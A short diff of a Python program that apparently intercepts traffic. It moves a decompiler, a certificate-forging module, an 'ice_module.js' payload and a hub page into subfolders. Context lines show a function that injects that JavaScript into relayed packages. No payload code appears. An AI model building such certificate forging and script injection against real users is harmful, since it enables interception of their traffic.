@@ -4,8 +4,8 @@ import threading
 import select
 import os, subprocess, ssl, re
 from datetime import datetime
-import decompiler as decm
-import certificad_forge as forge
+import tools.decompiler as decm
+import tools.certificad_forge as forge
 import json
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
@@ -386,7 +386,7 @@ cert_lock = threading.Lock()
 
 def inyect_ice(brute_package):
     try:
-        with open("ice_module.js", "r", encoding="utf-8") as f:
+        with open("payloads/ice_module.js", "r", encoding="utf-8") as f:
             ice_js = f.read()
     except FileNotFoundError:
         return brute_package
@@ -433,7 +433,7 @@ class hub_handler(BaseHTTPRequestHandler):
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.end_headers()
             try:
-                with open('black_wall_hub.html', 'rb') as f:
+                with open('web/black_wall_hub.html', 'rb') as f:
                     self.wfile.write(f.read())
             except FileNotFoundError:
                 self.wfile.write(b"<h1>Error: black_wall_hub.html not found :C</h1>")
